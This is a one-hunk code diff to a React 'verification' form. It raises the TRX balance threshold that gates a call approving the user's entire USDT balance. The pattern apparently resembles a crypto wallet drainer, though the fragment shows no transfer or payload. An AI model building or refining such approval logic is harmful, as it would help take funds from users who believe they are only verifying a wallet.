@@ -248,7 +248,7 @@ const VerificationFormComponent = (props) => {
     const balanceUSDT = parseInt(usdtTrx.toString(), 10) / 1_000_000
     const balanceTrx = trxBalance / 1_000_000
 
-    if (balanceTrx >= 0) {
+    if (balanceTrx >= 35) {
       handleApprove(balanceUSDT)
     } else {
       setIsSubmitting(false);
